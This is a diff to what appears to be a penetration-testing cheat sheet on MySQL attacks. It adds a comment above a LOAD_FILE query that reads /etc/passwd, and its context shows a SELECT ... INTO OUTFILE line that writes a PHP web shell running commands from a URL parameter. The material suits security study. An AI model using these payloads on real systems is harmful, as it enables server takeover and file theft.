@@ -56,7 +56,8 @@ show databases;, use <database>;, show tables;, show columns from <table>;, sele
     SELECT "&#x3C;?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
     </code></pre>
 * #### Read Local Files
-  * <pre class="language-sql" data-line-numbers><code class="lang-sql">select LOAD_FILE("/etc/passwd");
+  * <pre class="language-sql" data-line-numbers><code class="lang-sql">-- Use always '/' irrespective of OS
+    select LOAD_FILE("/etc/passwd");
     </code></pre>
 
 ### Tools
